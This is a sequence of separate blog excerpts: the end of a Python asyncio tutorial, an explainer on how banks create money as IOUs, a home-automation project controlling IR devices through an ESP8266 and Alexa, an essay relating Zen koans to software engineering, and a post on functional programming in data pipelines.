        <span>await</span> <span>asyncio</span><span>.</span><span>wait_for</span><span>(</span><span>async_sleep</span><span>(),</span> <span>timeout</span><span>=</span><span>1.0</span><span>)</span>
    <span>except</span> <span>asyncio</span><span>.</span><span>TimeoutError</span><span>:</span>
        <span>print</span><span>(</span><span>'Timeout error'</span><span>)</span>

<span>asyncio</span><span>.</span><span>run</span><span>(</span><span>main</span><span>())</span>
</code></pre></div></div><p>
The async function will raise <code>TimeoutError</code> if the coroutine doesnâ€™t return before the given <code>timeout</code> is passed.</p><p>
Response after executing the above code is</p>
<p>

There are other awesome methods in the <code>asyncio</code> module.</p><p>
You can check them at <a href="https://docs.python.org/3/library/asyncio-task.html">pythonâ€™s official website</a>.</p>
<h2 id="conclusion">Conclusion</h2><p>
If you want to provide a better and faster experience to your users, you can start using the <code>asyncio</code> module in your application. This will definitely help you find cases in which you can reduce the execution time of your API or whatever else that you are doing.</p><p>
Just forcing yourself to write in this way for a few months can yield big returns in the future.</p>

<p>Most people are familiar with central banks’ ability to create money out of thin air. A central bank has access to physical printing presses which can produce physical banknotes, and it has the corresponding ability to create electronic money. However, central banks are not the only entities which create money. Money is also created by regular banks, such as retail banks and commercial banks, in the process of making loans.</p>
<p>Many people believe that regular banks’ ability to create money is similar to central banks’ ability to create money. It is not. This misconception has been perpetuated by a powerful cast of characters which includes <a href="https://www.hs.fi/tiede/art-2000002869261.html" target="_blank">mainstream news outlets</a> and even <a href="https://www.sciencedirect.com/science/article/pii/S1057521914001070" target="_blank">some economists</a>.</p>
<p>This article will demystify money creation by illustrating the following facts:</p>
<ul>
<li>A bank deposit is merely an IOU.</li>
<li>A bank loan is merely an exchange of 2 IOUs.</li>
<li>Anyone can create IOUs out of thin air.</li>
<li>When a customer redeems an IOU at a bank, the bank typically needs to hand over another form of money — the kind that it cannot create out of thin air.</li>
</ul>
<p><strong>Bank deposits are merely IOUs</strong></p>
<p>Suppose you have $100 in cash. You decide to deposit it at your local bank. Now you no longer have $100 in cash. Instead, you have a <em>promise</em> from the bank that you can withdraw $100 in cash at any time. The bank has $100 in cash and you have a promise. Let’s imagine this promise as a physical document acknowledging debt, an IOU (”I owe you”). The bank owes you $100 and promises that you can exchange this IOU to $100 cash at any time.</p>

<p>Is this IOU ”money”? We’ll get to that later, but the short answer is yes, that IOU is money. There are different types of money, and checking account deposits are usually considered to be a type of money.</p>
<p>Let’s illustrate this bank deposit as an exchange:</p>

<p>Assets are things the bank <em>owns</em>, liabilities are things the bank <em>owes</em>. In this simplified example, the only asset that the bank has is the $100 in cash that you deposited — now considered to be the <em>bank’s</em> asset — and the only liability is the $100 debt that the bank owes to you. These accounting entries were created at the same time: when the bank incremented your checking account by $100 (the deposit liability in bank’s accounting), there was a corresponding $100 cash deposit (the cash asset in bank’s accounting).</p>
<p><strong>A bank loan is merely an exchange of 2 IOUs</strong></p>
<p>Let’s continue with the example where you deposited $100 to a bank. Suppose I will go into that bank and ask for a $10 loan. Now that the bank owns $100, it can easily afford to loan me $10. I promise to pay back $11 at a later point in time, so the bank is eager to offer me a loan and make that dollar.</p>
<p>The bank deposits this $10 loan to my checking account. Remember, checking account deposits are IOUs, so the bank just gave me a $10 IOU. I promised to pay back $11, so I also created an IOU. In other words, this loan is an exchange of 2 IOUs: the bank promises to give me $10 in cash whenever I want, and I promise to give the bank $11 at a later point in time. Let’s imagine these IOUs as physical documents:</p>

<p>The bank still has that $100 cash in assets, and it still has that $100 liability to John. But now the bank also has a $10 liability to me: I could withdraw my $10 from the bank in cash at any time. Corresponding to this liability, the bank has recorded a new asset: my promise to pay back $11 later.</p>
<p>Notice how the bank now has $110 of deposits, but only $100 of cash in the vault. Welcome to fractional reserve banking! If I decided to withdraw my $10 from the bank today, and you decided to withdraw your $100 from the bank tomorrow, the bank would say ”oops, we no longer have your money”. In practice this rarely happens due to a myriad of reasons (banks can trade assets between each other when they have too little/too much cash, banks have internal risk controls which limit lending and other risky endeavours, lawmakers impose restrictions which are monitored by regulators, the existence of deposit insurance reduces likelihood of bank runs, etc.).</p>
<p>Anyway, let’s get to the interesting bit. Before taking out the loan there was $100 on checking account balances and afterwards there was $110 on checking account balances. Clearly, money was created in the process of taking out the loan. Where did this money come from? Was it created out of thin air? The short answer is yes, kind of, but let’s step back a little bit.</p>
<p><strong>What is money, anyway?</strong></p>
<p>Let’s go back to the cash deposit example. You deposit $100 into a bank and the bank records it as an asset. The bank records a corresponding liability: a $100 deposit to your checking account. Did the bank create money in this scenario?</p>
<p>Before the deposit there was $100 of cash money, but after the deposit there was $100 of cash money + $100 of electronic money = $200 worth of money in total. But of course we don’t want to ”double count” your money just because you deposited it in a bank, right? That’s why economists developed this convention that cash money in a bank’s vault is considered to be ”out of circulation”, and thus, is not typically counted when we count how much money exists.</p>

<p>The Eurozone M1 definition for money is <a href="https://www.ecb.europa.eu/stats/money_credit_banking/monetary_aggregates/html/hist_content.en.html" target="_blank">basically</a> equal to this notion of ”currency in circulation”. The concept of money is ambiguous, so there are many different definitions, varying by both economic area and by use case. Nevertheless, checking account balances are included in most commonly used definitions (though not in all, for instance the UK M0 definition for money <a href="https://www.bankofengland.co.uk/statistics/details/further-details-about-m0-data" target="_blank">does not</a> include checking account balances).</p>
<p>In abstract terms we might think that the $100 cash you deposited into a bank was transformed into a $100 checking account balance. Except it wasn’t. That $100 of cash money still exists. It was not transformed into anything. The bank took $100 of cash and put it in a vault. Then the bank created an IOU out of thin air and gave it to you. (We can say that the IOU was created out of thin air, because the corresponding $100 cash in the vault is not earmarked to this IOU — the bank may run out of cash before you try to redeem that IOU.) Then economists decided that the IOU counts as money, and the cash in the vault does not count as money. Thus, the act of depositing cash in a bank does not result in (net) creation of money. $100 of electronic money is added to circulation while $100 of cash money is removed from circulation, for a net difference of $0.</p>
<p>When you deposit cash in a bank, the bank creates an IOU out of thin air. Similarly, when you take a loan out of a bank, the bank creates an IOU out of thin air. However, due to accounting conventions, the latter action results in net money creation, while the former action does not. (Although these conventions are weird, they make sense: currency in circulation is a good measure with real implications for economic activity, and currency in circulation is genuinely increased when banks loan money.)</p>
<p><strong>Anyone can create IOUs out of thin air</strong></p>
<p>If there’s only one thing you take away from this article, let it be this. IOUs are promises. Anyone can make promises out of thin air. For example, I could be handing out IOUs like this, furbished with my signature for authenticity:</p>

<p>You might think these would be worthless, but that’s not exactly the case. People who know me would think ”Atte is good for $10”. These would not be worth exactly $10, because you would still rather take $10 in cash than a coupon that’s exchangeable for $10 in cash. And it’s unlikely that these IOUs would be used to facilitate real economic activity, so these IOUs should not be considered ”money”. Although there are clear differences in how these IOUs <em>would be used</em>, compared to the IOUs created by banks, is there any <em>fundamental</em> difference between the IOUs themselves?</p>
<p>Let’s take another example and get one step closer to creating money. This one is real, not hypothetical, example of IOUs created by a non-bank corporation.</p>
<p>We have to go all the way back to 2011. Poker is booming and Full Tilt Poker is one of 2 giants dominating the scene (the other being PokerStars). The way that poker sites work is you deposit money (like you would in a bank) and then as you play poker and you win and lose money from other players, the poker site keeps track of how much money everyone has (like a bank would keep track of transfers between customers of the same bank).</p>
<p>In other words, a poker site issues IOUs to players. These IOUs are supposedly redeemable at any time (like the IOUs created by a bank). The IOUs created by Full Tilt Poker were largely treated as money by players of the site, to the point where they were used to facilitate real economic activity. For example, it was typical for players to settle small debts (like $10 for a movie ticket) by sending a player-to-player transfer on Full Tilt Poker instead of sending a bank transfer (because transfers on poker sites were typically faster and easier to make than bank transfers).</p>

<p>For all intents and purposes, the IOUs created by Full Tilt Poker were money. They simply were not counted as money due to accounting conventions. Now, some of you might be thinking <em>”Wait a minute… Doesn’t the poker site have all player funds in the bank? If all player funds have corresponding bank deposits, then those bank deposits would already be counted as money, and we wouldn’t want to double count that money.”</em> Yeah, I also thought that Full Tilt Poker had player funds in the bank (can you guess where this is going?).</p>
<p>On April 15, 2011, known in the poker world as <a href="https://en.wikipedia.org/wiki/United_States_v._Scheinberg" target="_blank">Black Friday</a>, the FBI raided offices of Full Tilt Poker and PokerStars as part of a larger crackdown on online gambling. This law enforcement action triggered an instant bank run by players: everyone …</p></div></div></div>

<p>With the increased amount of time I’ve spent in my apartment over the last few months and my new found electronics hobby, I thought it’d be fun to try and automate my studio apartment.&nbsp;</p>



<p>Here’s a picture of the apartment (above) in all of it’s 450 square foot glory. </p>



<p>I spend most of my time in the area with my desk, bed, sofa, and television. So, it made sense to focus on making this area as comfortable and usable as possible.&nbsp;</p>



<p>Take note of the robotic vacuum cleaner, the standing fan, and the television. I use these devices daily, but more importantly, they all respond to IR signals.</p>



<p>Consequently, I knew if I could decode the signal their IR remotes were sending, I’d be able to create a circuit that could broadcast an identical signal thereby controlling the device. Additionally, with an Amazon Alexa integration, I’d conceivably be able to make all of these devices voice-controlled.&nbsp;</p>



<h2>Demo</h2>



<p>Here’s a brief demo of the finished project. If you’re interested in seeing the circuit, code, and other implementation details, read on! Not only can I control my TV through Alexa, but also my standing fan and my robot vacuum cleaner. </p>



<figure><p>

<p>Here’s a demo of the fan. Triggering the sleep timer command cycles through the different delay options until the 1, 2, and 4 hour options are all enabled. </p>

</p></figure>



<p>Finally, here’s a demo of the robot cleaner returning to the home station when the “dock” command is triggered. </p>



<figure><p>

</p></figure>



<h2>Implementation</h2>



<p>The first step was identifying the correct IR codes to send which was by far the most involved part of this project. I had seen some other examples online of people trying to reverse engineer the IR codes their remote controls were sending and they were getting back a single clear value.&nbsp;</p>



<p>Unfortunately, I wasn’t so lucky. Any remote control key I pressed would give me a slew of possible signal codes – not just one discrete value. </p>



<p>So, in order to find the correct one, I’d press the button I was trying to decode a few times to build up a potential list of valid IR signals. Then, I’d programmatically loop through them slowly to try and identify which IR signal was actually triggering the device. </p>



<blockquote><p>Figuring out what IR encoding the signals were using was another time and research-intensive task.&nbsp;</p></blockquote>



<p>Here’s the schematic for the IR receiver:&nbsp;</p>



<figure><img src="https://lh3.googleusercontent.com/9aIHnUoDInPSudNujmBCmDYByZtYpPrH8BlIoplioo65dvTrtOjfLCUuR3TtyPTuCDumUsERv2tS1FzRuXFZjUmZgkSg8sF2G2Sp0Mh9wuFjmTXxU3RdjseWvq0N9dgRimRriktr" alt="" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>



<p>The final circuit is rather simple – an ESP8266 (for WiFi capabilities), a PN2222 transistor, and two IR LEDs. You certainly don’t need 2 IR LEDs, but I wanted greater coverage in the apartment and I had some parts to spare. </p>



<p>You can easily find the parts on Amazon and they’re all just soldered to a spare piece of perfboard.</p>



<p><img src="https://lh5.googleusercontent.com/JyV0pAaK6x43Sfc4dHxRnqnMbKefIvrq3aYbgWemNlb22-Bc6VTeGZM-2RPrdC5DaH6xXPZEan9rVfp-V07plvFNwAiNoBELJK1SzJ2k0T7rxlg5dHMmCPN7r3NQhxNmpvs9HeLA" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>



<p>Though it’s hard to tell in the photo, the two IR LEDs are angled slightly away from one another to increase coverage of the apartment. </p>

<blockquote><p>A few tips if you’re trying to replicate this yourself. </p><p>For a while, I was getting a lot of noise or absolutely no IR values back at all from the IR receiver. I realized that the ambient light was interfering with the IR receiver. So, the simplest solution was just to hide the circuit and the remote control under a blanket while trying to record IR signals to eliminate any noise from ambient light.&nbsp;</p></blockquote>



<p>Make sure to replace the placeholders in the following code. This code is meant for an ESP8266, but should also be compatible with an ESP32. &nbsp;There’s certainly cleaner ways of writing this code, but my focus was on creating a proof of concept. </p>







<blockquote><p>For the “clean up” and “dock” commands, I repeat the signal at regular intervals in the hopes that the robot vacuum cleaner is in the line of sight of the circuit at one of those time intervals. Unlike all of the other devices, the location of the robot isn’t static.</p></blockquote>



<p>Now, I had a circuit that was capable of controlling the main devices in my apartment. The next step was the Alexa integration. </p>



<h2>Alexa Integration</h2>



<p>The first issue I ran into was how to establish a connection between the Alexa and the ESP8266. Both were on the same local network, but I couldn’t find a way of setting up Alexa to make a local web request. Initially, it seemed like configuring port forwarding on my router was the only option and I wasn’t too keen on doing that. </p>



<p>Eventually, after a bit more research, I realized that Alexa could talk to <a href="https://ifttt.com/" target="_blank" rel="noreferrer noopener">IFTTT</a> and that IFTTT had an <a href="http://adafruit.com/" target="_blank" rel="noreferrer noopener">Adafruit</a> integration. This meant I could use the <a href="https://en.wikipedia.org/wiki/MQTT" target="_blank" rel="noreferrer noopener">MQTT</a> protocol to pass commands from Alexa to my circuit through Adafruit.&nbsp;</p>



<blockquote><p>The MQTT protocol, in essence, is a publisher/subscriber model often used by IoT devices. In this use case, Alexa would publish different messages (turn on tv, turn on fan, clean up) and the circuit would subscribe to Alexa’s broadcast and trigger the correct IR signal.</p></blockquote>



<h2>Tutorial</h2>



<p>If you’re interested in replicating this same flow, start off by <a href="http://io.adafruit.com/" target="_blank" rel="noreferrer noopener nofollow">creating a free Adafruit account.</a></p>



<p>Once you’re logged in, go to Feeds and create a new Feed. In my case, I titled it <code>smartStudio</code>.  This Feed will be a running list of all messages sent to this topic over the MQTT protocol. As you can see, a log of all the voice commands I’ve used in the last month appear in this Feed.</p>

<p>Click on <code>This</code> and select Amazon Alexa. Then, select the Alexa “say a specific phrase” integration.</p>



<blockquote><p>You’ll be asked to complete a small authorization flow if this is the first time you’re integrating these services.</p></blockquote>



<p>Now, whenever we say the phrase we define here, Alexa will trigger the “that” portion of your IFTTT integration.</p>

<p>Now, we can send a message to our Adafruit Feed with a custom payload, in this case <code>hbo</code>. All that’s remaining is to handle this case in the code and fire off the right IR signal.</p>



<p>Once you’ve created a few more triggers, your IFTTT dashboard should look something like this: </p>

<h2>Troubleshooting</h2>



<p>Because the MQTT framework doesn’t guarantee delivery of a message, sometimes I would give Alexa a command, but the ESP8266 chip would never receive it. </p>



<p>It’s a fairly rare occurrence and since Adafruit doesn’t allow me to customize the quality of service settings for the MQTT implementation, there’s no immediate solution to this problem.&nbsp;</p>







<h2>Some finishing touches</h2>



<p>Now, we’re on the home stretch. We’re able to issue a command to Alexa, which gets forwarded to IFTTT, then to Adafruit, and finally to my circuit which sends out the correct IR signal.&nbsp;</p>



<p>The final issue, however, was that even though saying “Alexa, trigger clean up” and having my robot vacuum cleaner spin up was pretty cool, I really disliked the sound of the robot bumping into everything as it cleaned. The noise is very noticeable in such a small apartment. </p>



<p>Eventually, I stumbled upon the “Routines” feature in the Amazon Alexa iOS app which allowed me to set up a few location-based triggers. </p>



<p>So, whenever I left my apartment, Alexa would trigger the “clean up” command. The robot would start up, and then 15 minutes later, Alexa would trigger the “dock” routine.&nbsp;</p>

<p>Now, my apartment would consistently stay clean and I wouldn’t have to hear the robot bumping around everywhere. Additionally,&nbsp; I added another routine that monitored my location to detect when I was heading back to my apartment and would preempt the cleaning with a “dock” command.&nbsp;</p>



<p>Solving first world problems, I know.&nbsp;</p>



<p>For a more useable experience, I’d also recommend enabling “follow up” mode (allows you to issue multiple commands at once) and “brief responses” on Alexa.</p>

<p>Now that I’ve had this installed for a couple months, I wanted to see how often I actually used it. After pulling the logs from Adafruit, I’ve used this over 800 times in this month alone [August 2020], an average of almost 30 times a day.</p>

    <h2>Good Software Engineers Are Rare</h2>
<p>Good software engineers are rare. There are many reasons as to why. The most obvious reason is that to become a good software developer one has to master many skills (language proficiency, documentation literacy, debugging, text editing, architecture, and design, etc, etc). Because these are the obvious barriers to becoming good, there is an abundance of advice out there for young engineers on how to hone their skills. Most of this advice is either uninteresting, inefficient, or both. Why? Because the process of mastering a skill is typically independent of the skill being mastered. The process is almost always as simple as: learn (read technical material), practice (daily), have patience.</p>
<p>Unfortunately, mastering the skills is not enough to become a good engineer. If it were, the good software engineer would be no rarer than the hardworking, motivated engineer. Having the essential hard/technical skills mastered is only the start. To become great, the software engineer must adopt a mindset that often operates in opposition to the philosophical structure of the western world.</p>
<h2>Software Products Are Unique</h2>
<p>My development as an engineer began outside of the software world. I studied electrical engineering where I spent countless hours of my life in the lab: designing circuits, prototyping on breadboards, acid bathing PCBs. All of these efforts led to a finished, permanent product. Whether it be a power supply I could plug my computer into, a multimeter, an antenna, or some mostly useless gadget, I always had something I could hold in my hands that gave me a sense of pride and satisfaction. Productive societal activity tends to operate similarly. There is the expectation of tangible end results, and the success of an activity or task is contingent on the end result. For example, there are few companies or teams that do not set KRs (key results) each quarter, half, year. Developing software products, peskily enough, is decidedly unlike this. A software product is ephemeral. It can't be held or touched. There is no definitive "end result" or "finished product". What's more, the work done is impermanent. These traits aren't just unique, they clash with many fundamental expectations about the way we believe work/productive activity should behave. Whether consciously or subconsciously all good software engineers have had to internalize some sort of framework to allow themselves to reckon with this cognitive dissonance.</p>
<h2>Look To The East</h2>
<p>So what must a software engineer do if they can't rely on societal norms of the west to help them build the skills, temperance, and mindset to become competent, productive, and successful? They must <a href="https://www.theculturium.com/hermann-hesse-the-journey-to-the-east/">look to the east</a>. The western concepts that the software engineer must cast aside are:</p>
<pre><code> attachment
 permanence
 duality
 reason
</code></pre>

<p>The philosophy of Zen Buddhism rejects these cornerstones of western life. So it is in the delightful riddles/stories that the Zen Buddhists call <a href="http://www.ashidakim.com/zenkoans/zenindex.html">Koans</a> that we might look for answers. The following are three of my favourite Koans that have been helpful on my path to becoming that rare and golden, madly productive, madly exact engineer.</p>
<h2>Non-Attachment</h2>
<pre><code>"Kitano Gempo, Abbot of Eihei temple, was ninety-two years old when he passed away in the year 1933. He endeavored his whole life not to be attached to anything. As a wandering mendicant when he was twenty he happened to meet a traveler who smoked tobacco. As they walked together down a mountain road, they stopped under a tree to rest. The traveler offered Kitano a smoke, which he accepted, as he was very hungry at the time.

"How pleasant this smoking is," he commented. The other gave him an extra pipe and tobacco and they parted.

Kitano felt: "Such pleasant things may disturb meditation. Before this goes too far, I will stop now." So he threw the smoking outfit away.

When he was twenty-three years old he studied I-King, the most profound doctrine of the universe. It was winter at the time and he needed some heavy clothes. He wrote his teacher, who lived a hundred miles away, telling him of his need, and gave the letter to a traveler to deliver. Almost the whole winter passed and neither answer nor clothes arrived. So Kitano resorted to the prescience of I-King, which also teaches the art of divination, to determine whether or not his letter had miscarried. He found that this had been the case. A letter afterward from his teacher made no mention of clothes.

"If I perform such accurate determinative work with I-King, I may neglect my meditation," felt Kitano. So he gave up this marvelous teaching and never resorted to its powers again.

When he was twenty-eight he studied Chinese calligraphy and poetry. He grew so skillful in these arts that his teacher praised him. Kitano mused: "If I don't stop now, I'll be a poet, not a Zen teacher." So he never wrote another poem. "
</code></pre>

<p>In this koan, Kitano displays an ability that every software engineer should find enviable: a relentless non-attachment to all things outside of the pursuit of Zen. A software project is in constant flux. So is the state of tools, technology, and frameworks in the field. There is a serious lack of permanence in software development, and the best way to cope with that impermanence is to become a solid practitioner of non-attachment.</p>
<p>The inability for ICs to remain unattached to particular pieces of work completed, or particular technologies is probably one of the most common and detrimental problems software development teams encounter. Features that have had blood, sweat, and tears poured into them but do not serve a purpose fail to get removed, technologies invested in that end up being duds do not get replaced. All of this results in projects and companies suffering major setbacks. Ben Horowitz frames the problem well in his book <a href="https://www.goodreads.com/book/show/18176747-the-hard-thing-about-hard-things">The Hard Things about Hard Things</a>: "Early in my career as an engineer, I'd learned that all decisions were objective until the first line of code is written. After that, all decisions were emotional." The less attached a team of engineers is to their own work, the less emotional the decisions about a project will be. Good engineers are happy to delete their own code. A leaner code base is an easier codebase to work in. Good engineers are excited when a teammate finds a more robust, easier-to-work-with solution to the problem they have been working on. They don't create inertia and waste time by resisting switching to that solution, no matter how much work they have sunk into their own implementation. Good engineers are like Kitano.</p>
<h2>It Will Pass</h2>
<pre><code>A student went to his meditation teacher and said, "My meditation is horrible! I feel so distracted, or my legs ache, or I'm constantly falling asleep. It's just horrible!"

"It will pass," the teacher said matter-of-factly.

A week later, the student came back to his teacher. "My meditation is wonderful! I feel so aware, so peaceful, so alive! It's just wonderful!'

"It will pass," the teacher replied matter-of-factly.
</code></pre>

<p>Mmm, such a beautiful dialogue. Reading it quells the destructive flames of pride and ego that flare-up in my stomach whenever I am on a productive kick. Many engineers thrive off of the energy of this fire, but it can be dangerous if untempered. Engineers, it has been said, are natural optimists. Engineers are also, I will posit, naturally prideful. When they are assigned a project or ticket and are asked to estimate how long it will take, they almost certainly will imagine themselves at their most productive when making the estimate. This results in the unenlightened engineer wreaking no small havoc on the logistics of managing a project. No engineer is at their most productive at all times; the productive fervor of a great session is fickle. The engineers who assess their own skills and compare themselves to their colleagues as if they are, hurt themselves and their team. They stunt their growth (by believing they are already outperforming all their colleagues), are hard to manage, and are hard to work with.</p>
<p>Recently, while working on extending our application's backend to be accessible via a GraphQL API, I came across a few blogposts by an engineer named Marc-Andre Giroux. Clearly, a quite talented engineer, I noticed a neat little feature on his <a href="http://mgiroux.me/">site's homepage</a>. As a play on the 10x engineer motif, he describes himself as an "Nx platform interface engineer", the N flitting randomly between decimal numbers from 0 to 10. Marc-Andre is clearly a talented engineer, yet is zen enough to appreciate that he is not always in the state of ultra-productive. Admittedly, sometimes he is even less than 1x engineer. He understands "It will pass" and is most likely a factor in his success.</p>
<p>Avoiding overestimation of yourself is not the only lesson to be learned. This koan helps me to avoid taking productive times for granted. Understanding that quieter seas and lulls in productivity and focus may be just around the corner is good motivation to keep pushing for more while you are in the zone. Zen has taught me to never let a good session go to waste.</p>
<p>Finally, this koan helps me during the unproductive and unfocused times as well. I often experience a quite intense physical aching and pain during those hours where I can't seem to get any code written, or worse when I can only seem to produce poor, convoluted, messy solutions. Knowing that such a state is somewhat inevitable and that It Will Pass, is a medicative and constructive mindset to have.</p>
<h2>First There is a Mountain</h2>
<pre><code>At the first level on the path, he saw mountains as mountains and rivers as rivers.

On the second level of the path, he saw that mountains are not mountains and rivers are not rivers.

And at a third level, he saw once again mountains were mountains and rivers were rivers.

<p>This koan is a description of the Zen student <a href="https://plato.stanford.edu/entries/japanese-zen/#OveDua">overcoming dualism</a>. In Zen, the idea is called "Not Two". The student first sees the river as discrete from the mountains. The student then sees that …</p></div></div>

	<p>During my years as a software engineer, I got exposed to more and more
data-based projects where data engineering and model research were
major aspects of the system.</p>

<p>Over time, one main pattern became apparent: the functional programming
paradigm helps a lot when working with data-oriented systems.</p>

<p>For a regular data scientist or a data engineer, they will be quite familiar
with ETL (Extract, Transform, Load) pipelines. However, not all data scientists
and data engineers are familiar with functional programming and its
benefits.</p>



<p>I’ll remind again, that according to Uncle Bob, 
the essence of functional programming is that</p>

<blockquote>
  <p>Variables in functional languages do not vary</p>
</blockquote>

<p>and</p>

<blockquote>
  <p>Functional programming is disciple imposed upon variable assignment.</p>
</blockquote>

<p>Or, according to <a href="https://en.wikipedia.org/wiki/Functional_programming">Wikipedia</a>:</p>

<blockquote>
  <p>In computer science, functional programming is a programming paradigm where programs are constructed by applying and composing functions. It is a declarative programming paradigm in which function definitions are trees of expressions that each return a value, rather than a sequence of imperative statements that change the state of the program.</p>
</blockquote>

<p>In other words, you can assign variables a new value, but existing values cannot change.</p>

<p>A few examples:</p>
<div><div><pre><code><span># BAD
</span><span>my_var</span> <span>=</span> <span>{</span><span>'c'</span><span>:</span> <span>'value'</span><span>}</span>
<span>my_var</span><span>[</span><span>'b'</span><span>]</span> <span>=</span> <span>'new_value'</span>
<span># or 
</span><span>my_var</span><span>[</span><span>'c'</span><span>]</span> <span>=</span> <span>'new_value'</span>

<span># GOOD
</span>
<span>my_var</span> <span>=</span> <span>{</span><span>'c'</span><span>:</span> <span>'value'</span><span>}</span>
<span>my_var</span> <span>=</span> <span>dict</span><span>(</span><span>**</span><span>my_var</span><span>,</span> <span>b</span><span>=</span><span>'new_value'</span><span>)</span>

<span># or
</span><span>my_var</span> <span>=</span> <span>{</span><span>'c'</span><span>:</span> <span>'new_value'</span><span>}</span>

</code></pre></div></div>

<p>using functions</p>
<div><div><pre><code><span># BAD
</span><span>def</span> <span>my_function</span><span>(</span><span>input_dict</span><span>):</span>
    <span>input_dict</span><span>[</span><span>'new_value'</span><span>]</span> <span>=</span> <span>'var'</span>
    <span>return</span> <span>True</span>

<span># GOOD
</span><span>def</span> <span>my_function</span><span>(</span><span>input_dict</span><span>):</span>
    <span>return</span> <span>dict</span><span>(</span><span>**</span><span>input_dict</span><span>,</span> <span>new_value</span><span>=</span><span>'var'</span><span>)</span>    

</code></pre></div></div>

<p>This has a few important implications:</p>
<ul>
  <li>if you receive value, you can be sure that it won’t change mid-processing because it was modified
 in another thread</li>
  <li>as a function caller, you can be sure that after calling the function passed in arguments
 haven’t changed and you can use them the same way before calling the function</li>
  <li>as a function writer, you can do whatever you want with the data, as long as you do not change
 the original value and return results in the new one</li>
</ul>

<p>As you can see, it reduces surprises and eases the cognitional context load of the programmer as
we do not  need to worry about the state of the entire program but just the 
local state (input)
of the function.</p>

<p>There is a common expectation that if you call the function with the same arguments, it will
return the same results. However, that is not always the case:</p>
<ul>
  <li>reading the same file, with the same filename, might produce a different result if the file was updated</li>
  <li>calling function that returns current time should return different time during each call</li>
  <li>etc</li>
</ul>

<p>These edge cases usually creep in from the environment (boundaries with the environment) and a keen
functional practitioner could work around these by introducing Environment or Context
states but for practical purposes it is more work than it is worth.</p>

<p>The implications above often lead to code structure that looks like this:</p>

<div><div><pre><code>
<span>x1</span> <span>=</span> <span>my_function_one</span><span>(</span><span>input</span><span>)</span>
<span>x2</span> <span>=</span> <span>another_call</span><span>(</span><span>x1</span><span>)</span>
<span>b3</span> <span>=</span> <span>third_call</span><span>(</span><span>x1</span><span>,</span> <span>x2</span><span>)</span>
<span>final_result</span> <span>=</span> <span>calculate</span><span>(</span><span>b3</span><span>)</span>
</code></pre></div></div>

<p>It’s easier to reason about the calls step-by-step as the context of each function call is
always limited.</p>

<p>As it usually happens, in data engineering data processing flows are often quite simple, and
the pipeline above looks like:</p>

<div><div><pre><code><span>x</span> <span>=</span> <span>my_function_one</span><span>(</span><span>input</span><span>)</span>
<span>x</span> <span>=</span> <span>another_call</span><span>(</span><span>x</span><span>)</span>
<span>x</span> <span>=</span> <span>third_call</span><span>(</span><span>x</span><span>)</span>
<span>final_result</span> <span>=</span> <span>calculate</span><span>(</span><span>x</span><span>)</span>
</code></pre></div></div>

<h2 id="coupling">Coupling</h2>
<p>One missing, but quite important, piece of this puzzle is that the functions should be cohesive (
one responsibility) and loosely coupled. What does it mean to be loosely coupled?</p>

<p>Let’s compare these two examples:</p>

<div><div><pre><code><span>def</span> <span>my_function_one</span><span>(</span><span>b</span><span>):</span>
    <span>#...
</span>    <span>return</span> <span>c</span>

<span>def</span> <span>another_call</span><span>(</span><span>b</span><span>):</span>
    <span>#...
</span>    <span>c</span> <span>=</span> <span>my_function_one</span><span>(</span><span>c</span><span>)</span>
    <span>return</span> <span>c</span>

<span>def</span> <span>third_call</span><span>(</span><span>b</span><span>):</span>
    <span>#...
</span>    <span>c</span> <span>=</span> <span>another_call</span><span>(</span><span>c</span><span>)</span>
    <span>return</span> <span>c</span>

<span>def</span> <span>calculate</span><span>(</span><span>b</span><span>):</span>
    <span>#...
</span>    <span>c</span> <span>=</span> <span>third_call</span><span>(</span><span>c</span><span>)</span>
    <span>return</span> <span>c</span>

<span>final_result</span> <span>=</span> <span>calculate</span><span>(</span><span>x</span><span>)</span>

</code></pre></div></div>

<p>and</p>

<div><div><pre><code><span>def</span> <span>my_function_one</span><span>(</span><span>b</span><span>):</span>
    <span>#...
</span>    <span>return</span> <span>c</span>

<span>def</span> <span>another_call</span><span>(</span><span>b</span><span>):</span>
    <span>#...
</span>    <span>return</span> <span>c</span>

<span>def</span> <span>third_call</span><span>(</span><span>b</span><span>):</span>
    <span>#...
</span>    <span>return</span> <span>c</span>

<span>def</span> <span>calculate</span><span>(</span><span>b</span><span>):</span>
    <span>#...
</span>    <span>return</span> <span>c</span>

<span>x</span> <span>=</span> <span>my_function_one</span><span>(</span><span>input</span><span>)</span>
<span>x</span> <span>=</span> <span>another_call</span><span>(</span><span>x</span><span>)</span>
<span>x</span> <span>=</span> <span>third_call</span><span>(</span><span>x</span><span>)</span>
<span>final_result</span> <span>=</span> <span>calculate</span><span>(</span><span>x</span><span>)</span>
</code></pre></div></div>

<p>What will happen, if <em>we</em> do not need to call <code>another_call</code>? In the first case, we could remove it
from the <code>third_call</code> function, but that would break functionality for all the other
users of <code>third_call</code> function.</p>

<p>Clearly, the latter case is more loosely coupled, because we can just drop the <code>x = another_call(x)</code>
line, we will achieve our goals, and the code won’t be broken for the other users.</p>

<p>The other nice thing is that nested function calls build this mental complexity hierarchy that
becomes harder to follow with each function. You can’t really understand what each function does
without traversing the hierarchy up and investigating all the other calls.</p>



<p>Now, we now know how to write nice “functional” functions. What can we do with that?</p>

<p>In the examples above we had a pipeline that processed just a single value. In most of the cases,
we operate on the lists. Those lists can be anything:</p>
<ul>
  <li>lists of lists</li>
  <li>lists of byte arrays</li>
  <li>lists of tuples that are made of other objects and other lists</li>
  <li>etc</li>
</ul>

<p>but we usually get some kind of list first. In Python, it means a specific type of array-like collection
but in reality, we just need some kind of Iterable.</p>

<h2 id="enter-the-map">Enter the map</h2>

<p>When we are processing a list of items, it is extremely easy to use the functions that we’ve defined
above to process the list using a <code>map</code>.</p>

<p>On Python, the call would look something like this:</p>

<div><div><pre><code><span>x</span> <span>=</span> <span>items</span>
<span>x</span> <span>=</span> <span>map</span><span>(</span><span>my_function_one</span><span>,</span> <span>x</span><span>)</span>
<span>x</span> <span>=</span> <span>map</span><span>(</span><span>another_call</span><span>,</span> <span>x</span><span>)</span>
<span>x</span> <span>=</span> <span>map</span><span>(</span><span>third_call</span><span>,</span> <span>x</span><span>)</span>
<span>x</span> <span>=</span> <span>map</span><span>(</span><span>calculate</span><span>,</span> <span>x</span><span>)</span>
</code></pre></div></div>

